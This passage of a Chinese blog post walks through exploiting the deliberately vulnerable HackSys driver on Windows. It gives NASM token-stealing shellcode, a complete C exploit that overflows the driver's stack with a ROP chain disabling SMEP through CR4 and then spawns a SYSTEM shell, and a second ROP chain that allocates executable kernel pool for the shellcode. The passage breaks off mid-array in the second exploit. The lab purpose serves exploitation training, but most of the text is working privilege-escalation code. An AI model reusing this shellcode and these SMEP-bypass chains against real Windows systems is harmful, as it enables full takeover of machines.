class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">SECTION .start_magic     </span><br><span class="line">db &quot;magic1&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SECTION .text</span><br><span class="line">;db 0xcc</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">xor rax, rax</span><br><span class="line">mov rax, [gs:rax + 188h]; gs[0] == KPCR, Get KPCRB.CurrentThread field</span><br><span class="line">mov rax, [rax+0xb8]; Get (KAPC_STATE)ApcState.Process (our EPROCESS)</span><br><span class="line">mov r9, rax;; Backup target EPROCESS at r9</span><br><span class="line"></span><br><span class="line">; loop processes list</span><br><span class="line">mov rax, [rax + 0x448]; +0x448 ActiveProcessLinks : _LIST_ENTRY.Flink; Read first link</span><br><span class="line">mov rax, [rax]; Follow the first link</span><br><span class="line">system_process_loop:</span><br><span class="line">mov rdx, [rax - 0x8]; ProcessId</span><br><span class="line">mov r8, rax;; backup system EPROCESS.ActiveProcessLinks pointer at r8</span><br><span class="line">mov rax, [rax]; Next process</span><br><span class="line">cmp rdx, 4; System PID</span><br><span class="line">jnz system_process_loop</span><br><span class="line"></span><br><span class="line">mov rdx, [r8 + 0x70]</span><br><span class="line">and rdx, 0xfffffffffffffff8; Ignore ref count</span><br><span class="line">mov rcx, [r9 + 0x4b8]</span><br><span class="line">and rcx, 0x7</span><br><span class="line">add rdx, rcx; put target&#x27;s ref count into our token</span><br><span class="line">mov [r9 + 0x4b8], rdx; rdx = system token; KPROCESS+0x4b8 is the Token, KPROCESS+0x448 is the process links - 0x70 is the diff</span><br><span class="line"></span><br><span class="line">;db 0xcc</span><br><span class="line">ret_to_usermode:</span><br><span class="line">;sti</span><br><span class="line">mov rax, [gs:0x188]; _KPCR.Prcb.CurrentThread</span><br><span class="line">mov cx, [rax + 0x1e4]; KTHREAD.KernelApcDisable</span><br><span class="line">inc cx</span><br><span class="line">mov [rax + 0x1e4], cx</span><br><span class="line">mov rdx, [rax + 0x90] ; ETHREAD.TrapFrame</span><br><span class="line">mov rcx, [rdx + 0x168]; ETHREAD.TrapFrame.Rip</span><br><span class="line">mov r11, [rdx + 0x178]; ETHREAD.TrapFrame.EFlags</span><br><span class="line">mov rsp, [rdx + 0x180]; ETHREAD.TrapFrame.Rsp</span><br><span class="line">mov rbp, [rdx + 0x158]; ETHREAD.TrapFrame.Rbp</span><br><span class="line">;db 0xcc</span><br><span class="line">xor eax, eax ; return STATUS_SUCCESS to NtDeviceIoControlFile </span><br><span class="line">swapgs</span><br><span class="line">o64 sysret; nasm shit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SECTION .end_magic     </span><br><span class="line">db &quot;magic2&quot; </span><br></pre></td></tr></table></figure><p>可以看到shellcode整体上除了相关结构的偏移不一致外,主要差异为</p><ol><li>对token指针的引用计数位段进行清空</li><li>额外对CurrentThread-&gt;KernelApcDisable字段加1,保证APC状态的一致,避免BSOD<code>APC_INDEX_MISMATCH</code></li><li>更合规的内核态退出结尾</li></ol><p>使用nasm将其编译后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm -f win64 sc.<span class="keyword">asm</span> -o sc.obj</span><br></pre></td></tr></table></figure><p>再使用ida等工具获取shellcode</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-25_221518.png" alt=""></p><p>完整的exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QWORD ULONGLONG</span></span><br><span class="line"></span><br><span class="line">BYTE dst_sc[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0xC1</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xFA</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xF0</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>,</span><br><span class="line">    <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xCA</span>, <span class="number">0x49</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x91</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x8B</span>, <span class="number">0x88</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0xFF</span>, <span class="number">0xC1</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x68</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4C</span>, <span class="number">0x8B</span>, <span class="number">0x9A</span>, <span class="number">0x78</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xA2</span>, <span class="number">0x80</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xAA</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x0F</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0xF8</span>, <span class="number">0x48</span>, <span class="number">0x0F</span>, <span class="number">0x07</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">QWORD <span class="title function_">getBaseAddr</span><span class="params">(LPCWSTR drvName)</span> &#123;</span><br><span class="line">  LPVOID drivers[<span class="number">512</span>];</span><br><span class="line">  DWORD cbNeeded;</span><br><span class="line">  <span class="type">int</span> nDrivers, i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (EnumDeviceDrivers(drivers, <span class="keyword">sizeof</span>(drivers), &amp;cbNeeded) &amp;&amp; cbNeeded &lt; <span class="keyword">sizeof</span>(drivers)) &#123;</span><br><span class="line">    WCHAR szDrivers[<span class="number">512</span>];</span><br><span class="line">    nDrivers = cbNeeded / <span class="keyword">sizeof</span>(drivers[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nDrivers; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (GetDeviceDriverBaseName(drivers[i], szDrivers, <span class="keyword">sizeof</span>(szDrivers) / <span class="keyword">sizeof</span>(szDrivers[<span class="number">0</span>]))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (wcscmp(szDrivers, drvName) == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> (QWORD)drivers[i];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE hDriver = CreateFile(<span class="string">L&quot;\\\\.\\HacksysExtremeVulnerableDriver&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (hDriver == INVALID_HANDLE_VALUE)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Error while creating a handle to the driver: %d\n&quot;</span>, GetLastError());</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  QWORD ntBase = getBaseAddr(<span class="string">L&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] NTBase: %llx\n&quot;</span>, ntBase);</span><br><span class="line">  QWORD POP_RCX = ntBase + <span class="number">0x202e71</span>;</span><br><span class="line">  QWORD MOV_CR4_RCX = ntBase + <span class="number">0x3a0bd7</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> bufSize = <span class="number">2072</span> + <span class="number">4</span> * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">  LPVOID uBuffer = VirtualAlloc(<span class="literal">NULL</span>, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  LPVOID shellcode = VirtualAlloc(<span class="literal">NULL</span>, <span class="number">256</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  RtlFillMemory(uBuffer, bufSize, <span class="string">&#x27;\x41&#x27;</span>);</span><br><span class="line">  RtlCopyMemory(shellcode, dst_sc, <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">  QWORD* rop = (QWORD*)((QWORD)uBuffer + <span class="number">2072</span>);</span><br><span class="line"></span><br><span class="line">  *(rop + index++) = POP_RCX;</span><br><span class="line">  *(rop + index++) = <span class="number">0x350ef8</span> ^ <span class="number">1UL</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">  *(rop + index++) = MOV_CR4_RCX;</span><br><span class="line">  *(rop + index++) = (QWORD)shellcode;</span><br><span class="line"></span><br><span class="line">  DeviceIoControl(hDriver, <span class="number">0x222003</span>, (LPVOID)uBuffer, bufSize, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] Enjoy your shell!\n&quot;</span>, ntBase);</span><br><span class="line">  system(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-25_221904.png" alt=""></p><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><p>第二种方式怎么试都没成功,明明都已经执行到shellcode了,但总是会有千奇百怪的错误(断点打在不同处竟然结果就会不一样…)</p><p>调试调到晕厥,就这样吧以后再研究</p><hr><p>对第二种方式完全使用gadget过于困难,所以还是要想办法在内核中执行shellcode,但要执行代码就肯定需要可控的可写可执行内存块</p><h4 id="分配内核可执行内存"><a href="#分配内核可执行内存" class="headerlink" title="分配内核可执行内存"></a>分配内核可执行内存</h4><p>驱动程序的开发人员可以分配不同类型的内存池。最基本的两类是分页池和非分页池类型。前者分配了一个不可执行的页式内存池以供使用，而后者分配了一个非页式池，默认情况下是可执行的。可以通过调用带有所需参数的 ExAllocatePoolWithTag()函数来执行分配。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PVOID <span class="title function_">ExAllocatePoolWithTag</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] __drv_strictTypeMatch(__drv_typeExpr)POOL_TYPE PoolType,</span></span><br><span class="line"><span class="params">  [in] SIZE_T                                         NumberOfBytes,</span></span><br><span class="line"><span class="params">  [in] ULONG                                          Tag</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><ol><li><strong><code>PoolType</code></strong>:指定内存池的类型。常见的类型包括：<ul><li><strong><code>NonPagedPool</code></strong>：未分页内存池，分配的内存不会被交换到磁盘，适用于中断服务例程（ISR）等需要快速访问的场景。</li><li><strong><code>PagedPool</code></strong>：分页内存池，分配的内存可能会被交换到磁盘，适用于不需要在中断上下文中访问的场景。</li><li><strong><code>NonPagedPoolNx</code></strong>：未分页内存池，且内存不可执行（No Execute），适用于安全敏感的场景。</li><li><strong><code>PagedPoolNx</code></strong>：分页内存池，且内存不可执行（No Execute）。</li></ul></li><li><strong><code>NumberOfBytes</code></strong>:要分配的内存大小（以字节为单位）。</li><li><strong><code>Tag</code></strong>:用于标识内存分配的标签（4 个字符）。标签通常用于调试和内存泄漏检测。</li></ol><p>这个函数无法在用户态使用,但是现在我们已经破除了kaslr,我们已经可以知道他在内核的加载位置了</p><p>那么我们可以利用rop去调用这个位置,并设置合适的参数即可</p><h4 id="寻找gadget"><a href="#寻找gadget" class="headerlink" title="寻找gadget"></a>寻找gadget</h4><p>使用ROPgadget或ropper这样的工具查找<code>C:\Windows\System32\ntoskrnl.exe</code>的gadget</p><p>足足找出了12m文本的gadgets,我们需要找怎样的gadget呢,windows的调用约定与linux有所不同,只用四个寄存器作为传参寄存器,剩余用栈传递,分别是rcx, rdx, r8, r9</p><p>我们现在要做的是,分配一块可执行的内存,然后将用户态的shellcode复制到内核态使用</p><p>我们的ROP链应该像这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xor ecx, ecx; ret; -&gt; zeroes out our RCX register, which is the first parameter of AllocatePoolWithTag()</span><br><span class="line">pop rdx; ret ; -&gt; pops 0x1000 (4096) to rdx register, which is the second parameter of AllocatePoolWithTag() and indicates the size of the pool</span><br><span class="line">0x1000 -&gt; value of rdx</span><br><span class="line">AllocatePoolWithTag() -&gt; calls the AllocatePoolWithTag function. The address of the allocated pool will then be in rax</span><br><span class="line">mov rcx, rax; ret; -&gt; copies the address to rcx, which will be first parameter of memcpy</span><br><span class="line">pop rdx; ret -&gt; gets the source address from stack. This will be our shellcode in userland that will escalate privileges.</span><br><span class="line">&lt;ADDRESS OF SHELLCODE&gt;</span><br><span class="line">0x0000000140201861: pop r8; ret;  -&gt; gets the size from stack.</span><br><span class="line">&lt;SIZE OF SHELLCODE&gt;</span><br><span class="line">memcpy() -&gt; calls the memcpy function and copies our payload to an executable kernel space</span><br><span class="line">jmp rax; -&gt; jumps to a register which stores the address of our shellcode in kernel land</span><br></pre></td></tr></table></figure><p>这是我们能够找到的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x202e71</span>: pop rcx; ret;</span><br><span class="line"><span class="number">0x0</span></span><br><span class="line"><span class="number">0x4e13ce</span>: pop rdx; ret; </span><br><span class="line"><span class="number">0x1000</span></span><br><span class="line">AllocatePoolWithTag()</span><br><span class="line"><span class="number">0x5b6164</span>: push rax; pop r13; ret;</span><br><span class="line"><span class="number">0x2714f6</span>: xchg r8, r13; ret; </span><br><span class="line"><span class="number">0x94133a</span>: mov rcx, r8; mov rax, rcx; ret; </span><br><span class="line"><span class="number">0x4e13ce</span>: pop rdx; ret; </span><br><span class="line">&lt;address of shellcode location in userland&gt;</span><br><span class="line"><span class="number">0x201861</span>: pop r8; ret; </span><br><span class="line"><span class="built_in">memcpy</span>() -&gt; calls the <span class="built_in">memcpy</span> function and copies our payload to an executable kernel space</span><br><span class="line"><span class="number">0x24b024</span>: jmp rax;</span><br></pre></td></tr></table></figure><p>显然很难找到完美符合要求的gadget,当然实际上因为我们之前已经把所有驱动的基址都打印出来了,也可以去其他的驱动中寻找gadget</p><p>不过即使这样,我们还没有完成gadget的编写</p><p>因为在x86-64 上的 Microsoft fastcall 调用约定中特有一个特有的概念叫做Shadow Space</p><blockquote><p>Shadow Space 是为函数调用预留的堆栈空间，通常由调用者分配，用于存储前四个通过寄存器传递的参数（<code>RCX</code>, <code>RDX</code>, <code>R8</code>, <code>R9</code>）。</p><p>即使参数实际上是通过寄存器传递的，调用者仍然需要在堆栈上分配 32 字节（每个寄存器占 8 字节）的空间。</p></blockquote><p>而我们需要调用的AllocatePoolWithTag()就是这样一个函数(一个分支的汇编如下)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nt!ExAllocatePoolWithTag:</span><br><span class="line">fffff807`39fb8010 48895c2408      mov     qword ptr [rsp+8],rbx</span><br><span class="line">fffff807`39fb8015 48896c2410      mov     qword ptr [rsp+10h],rbp</span><br><span class="line">fffff807`39fb801a 4889742418      mov     qword ptr [rsp+18h],rsi</span><br><span class="line">fffff807`39fb801f 57              push    rdi</span><br><span class="line">fffff807`39fb8020 4156            push    r14</span><br><span class="line">fffff807`39fb8022 4157            push    r15</span><br><span class="line">fffff807`39fb8024 4883ec30        sub     rsp,30h</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>可以看到其函数刚开始就会将rbx,rbp,rsi保存在rsp+8等位置,所以我们直接用上面获得rop链的话,那么我们的rop链就会被覆盖从而失效</p><p>所以我们要么在函数开始前<code>sub rsp 0x20 ret</code>结束后<code>add rsp 0x20 ret</code>,要么直接预留0x20无用空间供其写入</p><p>显然第二种方法会更简单一些因为我们只需要<code>add rsp 0x20 ret</code>这个gadget</p><p>那么我们完整的rop链应该长这样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x202e71</span>: pop rcx; ret;</span><br><span class="line"><span class="number">0x0</span></span><br><span class="line"><span class="number">0x4e13ce</span>: pop rdx; ret; </span><br><span class="line"><span class="number">0x1000</span></span><br><span class="line">AllocatePoolWithTag()</span><br><span class="line"><span class="number">0xa1b718</span>: add rsp, <span class="number">0x20</span>; ret;</span><br><span class="line"><span class="number">0x0</span></span><br><span class="line"><span class="number">0x0</span></span><br><span class="line"><span class="number">0x0</span></span><br><span class="line"><span class="number">0x0</span></span><br><span class="line"><span class="number">0x5b6164</span>: push rax; pop r13; ret;</span><br><span class="line"><span class="number">0x2714f6</span>: xchg r8, r13; ret; </span><br><span class="line"><span class="number">0x94133a</span>: mov rcx, r8; mov rax, rcx; ret; </span><br><span class="line"><span class="number">0x4e13ce</span>: pop rdx; ret; </span><br><span class="line">&lt;address of shellcode location in userland&gt;</span><br><span class="line"><span class="number">0x201861</span>: pop r8; ret; </span><br><span class="line"><span class="built_in">memcpy</span>() -&gt; calls the <span class="built_in">memcpy</span> function and copies our payload to an executable kernel space</span><br><span class="line"><span class="number">0x02b92f1</span>: jmp rax;</span><br></pre></td></tr></table></figure><p>完整的exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QWORD ULONGLONG</span></span><br><span class="line"></span><br><span class="line">BYTE dst_sc[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0xC1</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xFA</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xF0</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>,</span><br><span class="line">    <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span 